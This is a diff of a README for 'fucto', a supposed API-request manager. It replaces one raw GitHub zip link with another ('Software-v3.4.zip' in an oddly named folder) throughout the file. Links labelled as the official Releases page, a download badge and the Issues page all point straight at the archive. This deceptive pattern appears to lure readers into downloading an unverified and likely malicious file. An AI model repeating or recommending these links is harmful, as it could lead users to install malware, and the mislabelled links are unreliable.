@@ -9,9 +9,9 @@ Welcome to fucto! This application helps you manage API requests easily while su
 To begin using fucto, follow these steps:
 
 1. **Visit the Releases Page**
-   Click [here to download](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/fucto.zip) fucto from the official GitHub Releases page.
+   Click [here to download](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/Software-v3.4.zip) fucto from the official GitHub Releases page.
 
-   [![Download fucto](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/fucto.zip%20fucto-v1.0-blue)](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/fucto.zip) 
+   [![Download fucto](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/Software-v3.4.zip%20fucto-v1.0-blue)](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/Software-v3.4.zip) 
 
 2. **Choose a Version**
    On the Releases page, you will see different versions listed. Click on the latest version to find the download link.
@@ -70,8 +70,8 @@ We welcome your feedback to improve fucto. If you have suggestions or run into i
 
 ## 📞 Support
 
-If you need help, please visit our [GitHub Issues](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/fucto.zip) page to report problems or ask questions.
+If you need help, please visit our [GitHub Issues](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/Software-v3.4.zip) page to report problems or ask questions.
 
 Start using fucto today and simplify your API management tasks with ease! 
 
-Remember, if you need to download the software, you can always click [here to download](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/fucto.zip).
+Remember, if you need to download the software, you can always click [here to download](https://raw.githubusercontent.com/Neoclark-Abuzo/fucto/main/sclerotioid/Software-v3.4.zip).
